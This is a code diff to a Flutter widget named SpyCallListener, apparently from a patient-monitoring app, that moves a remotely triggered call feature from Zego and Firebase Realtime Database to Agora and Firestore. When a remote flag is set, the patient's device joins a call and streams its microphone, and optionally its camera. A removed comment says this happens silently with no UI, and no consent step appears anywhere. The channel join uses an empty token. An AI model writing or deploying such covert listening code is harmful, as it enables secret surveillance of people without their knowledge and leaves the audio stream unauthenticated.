@@ -1,11 +1,10 @@
+import 'dart:async';
 import 'package:flutter/material.dart';
 import 'package:flutter_riverpod/flutter_riverpod.dart';
-import 'package:firebase_database/firebase_database.dart';
-//import 'package:wakelock_plus/wakelock_plus.dart';
-import 'package:zego_express_engine/zego_express_engine.dart';
+import 'package:cloud_firestore/cloud_firestore.dart';
+import 'package:agora_rtc_engine/agora_rtc_engine.dart';
 import 'package:neuroguard/core/providers/spy_call_provider.dart';
 import 'package:neuroguard/core/services/spy_call_service.dart';
-import 'dart:async';
 
 class SpyCallListener extends ConsumerStatefulWidget {
   final String patientId;
@@ -22,11 +21,8 @@ class SpyCallListener extends ConsumerStatefulWidget {
 }
 
 class _SpyCallListenerState extends ConsumerState<SpyCallListener> {
-  late DatabaseReference _commandRef;
+  StreamSubscription<DocumentSnapshot>? _sub;
   bool _callActive = false;
-
-  // ✅ Added to store Firebase listener
-  StreamSubscription<DatabaseEvent>? _commandSub;
 
   @override
   void initState() {
@@ -34,65 +30,86 @@ class _SpyCallListenerState extends ConsumerState<SpyCallListener> {
     _startListening();
   }
 
-  // ── Exactly your existing listener logic ─────────────────────────────────
   void _startListening() {
-    _commandRef = FirebaseDatabase.instance
-        .ref('users/${widget.patientId}/commands');
+    _sub = FirebaseFirestore.instance
+        .collection('users')       // changed from 'patients'
+        .doc(widget.patientId)     // Firebase Auth UID — same on both sides
+        .snapshots()
+        .listen((snapshot) {
+      if (!snapshot.exists) return;
 
-    // ✅ Store the listener
-    _commandSub = _commandRef.onValue.listen((event) {
-      final data = event.snapshot.value as Map<dynamic, dynamic>?;
+      final data = snapshot.data();
       if (data == null) return;
 
-      final shouldCall = data['trigger_spy_call'] as bool? ?? false;
-      final mode = data['spy_call_mode'] as String? ?? 'audio';
+      final commands = data['commands'] as Map<String, dynamic>?;
+      if (commands == null) return;
 
-      if (shouldCall && !_callActive && mounted) {
-        if (mode == 'video') {
-          ref.read(spyCallProvider.notifier).triggerAudioVideo();
-        } else {
-          ref.read(spyCallProvider.notifier).triggerAudioOnly();
-        }
-        _autoJoinCall(mode: mode);
+      final shouldCall = commands['trigger_spy_call'] as bool? ?? false;
+      final mode = commands['spy_call_mode'] as String? ?? 'audio';
+
+      if (shouldCall && !_callActive) {
+        _joinAsPatient(mode: mode);
+      }
+
+      if (!shouldCall && _callActive) {
+        _leaveAsPatient();
       }
     });
   }
 
-  Future<void> _autoJoinCall({required String mode}) async {
+  Future<void> _joinAsPatient({required String mode}) async {
     _callActive = true;
     final isVideo = mode == 'video';
 
-    // Patient silently joins room — no UI shown
-    await SpyCallService.joinRoom(
-      userId: widget.patientId,
-      userName: 'Patient',
-      patientId: widget.patientId,
-      enableCamera: isVideo,
+    if (isVideo) {
+      ref.read(spyCallProvider.notifier).triggerAudioVideo();
+    } else {
+      ref.read(spyCallProvider.notifier).triggerAudioOnly();
+    }
+
+    final engine = SpyCallService.engine;
+    final agoraUid = SpyCallService.uidFromFirebaseId(widget.patientId);
+
+    await engine.enableAudio();
+    await engine.enableVideo();
+
+    if (isVideo) {
+      await engine.startPreview();
+    }
+
+    await engine.joinChannel(
+      token: '',
+      channelId: SpyCallService.channelName(widget.patientId),
+      uid: agoraUid,
+      options: ChannelMediaOptions(
+        clientRoleType: ClientRoleType.clientRoleBroadcaster,
+        channelProfile: ChannelProfileType.channelProfileCommunication,
+        publishCameraTrack: isVideo,
+        publishMicrophoneTrack: true,
+        autoSubscribeAudio: false,
+        autoSubscribeVideo: false,
+      ),
     );
 
-    // Patient stays on whatever screen they were on — no navigation
-    // Call ends when caregiver hangs up and resetTrigger fires
-    _commandSub = _commandRef.onValue.listen((event) {
-      final data = event.snapshot.value as Map<dynamic, dynamic>?;
-      if (data == null) return;
-
-      final shouldCall = data['trigger_spy_call'] as bool? ?? false;
-      if (!shouldCall && _callActive) {
-        _endCall();
-      }
-    });
+    debugPrint('SpyCall Patient: joined channel as uid=$agoraUid');
   }
 
-  Future<void> _endCall() async {
-    await SpyCallService.leaveRoom(widget.patientId);
+  Future<void> _leaveAsPatient() async {
+    final engine = SpyCallService.engine;
+    await engine.stopPreview();
+    await engine.leaveChannel();
     ref.read(spyCallProvider.notifier).reset();
     _callActive = false;
+    debugPrint('SpyCall Patient: left channel');
   }
 
   @override
   void dispose() {
-    // ✅ Properly cancel Firebase listener
-    _commandSub?.cancel();
+    _sub?.cancel();
+    if (_callActive) {
+      SpyCallService.engine.stopPreview();
+      SpyCallService.engine.leaveChannel();
+    }
     super.dispose();
   }
 
